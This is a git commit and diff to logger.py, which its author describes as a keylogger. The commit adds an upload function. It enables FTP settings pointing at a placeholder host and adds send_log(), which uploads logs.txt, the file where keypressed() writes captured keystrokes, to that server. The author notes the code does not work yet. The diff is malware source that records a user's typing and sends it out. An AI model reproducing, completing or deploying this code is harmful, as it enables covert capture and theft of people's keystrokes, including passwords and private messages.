20e1b26f6bbe4968b21f216f0525acef6b97adcf
Harry Caldwell <harrycaldwell2011@hotmail.co.uk>
2024-03-14 21:21:38 +0000

    Upload function
    Created the upload function for the keylogger, yes I know there are errors so it wont work, working on it

--- logger.py
+++ logger.py
@@ -6,10 +6,11 @@ import threading
 
 
 # FTP Configurations
-#ftp_server = 'server.ip'
-#ftp_username = 'username'
-#ftp_password = '123'
-#upload_interval = 3600  # Upload interval in seconds (1 hour)
+ftp_server = 'server.ip'
+ftp_username = 'username'
+ftp_password = '123'
+upload_interval = 3600  # Upload interval in seconds (1 hour)
+
 
 # This will be what logs the keys that are pressed, in addition to writing it to a file
 def keypressed(key):
@@ -19,12 +20,21 @@ def keypressed(key):
             char = key.char
             logKey.write(char)
         except:
-            return("Error")
+            return "Error"
+
 
 # Function to upload the log file to the specified FTP server
-#def send_log():
-    #try:
-        #ftp=FTP
+def send_log():
+    try:
+        ftp = FTP(ftp_server)
+        ftp.login(user=ftp_username, passwd=ftp_password)
+        with open('logs.txt', 'rb') as file:
+            ftp.storbinary('STOR logs.txt', file)
+        ftp.quit()
+        return "file uploaded"
+    except Exception as e:
+        return f"Error uploading log file: {e}"
+
 
 if __name__ == "__main__":
     listener = keyboard.Listener(on_press=keypressed)
